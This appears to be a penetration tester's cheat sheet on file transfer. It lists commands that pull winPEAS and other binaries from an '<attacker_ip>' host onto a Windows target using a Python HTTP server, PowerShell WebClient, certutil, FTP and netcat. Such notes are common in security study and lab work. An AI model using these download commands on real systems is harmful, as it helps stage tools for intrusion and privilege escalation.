# File transfer 


```powershell
[Kali] python3 -m http.server 8888
[Windows] powershell -c "(New-Object System.Net.WebClient).DownloadFile(\"http://<attacker_ip>:8888/winPEASany.exe\", \"winpeas.exe\")" 
```

```powershell
[Kali] python3 -m http.server 8888
[Windows] certutil -urlcache -split -f "http://<attacker_ip>:8888/winPEASany.exe" winpeas.exe
```

```powershell
[Kali] python -m pyftpdlib -p 21  
[Windows] ftp -A <attacker_ip>   
binary    
get winPEAS.exe   
bye 
```

```powershell
[Windows] nc -nlvp 4444 > incoming.exe
[Kali] nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe 
```
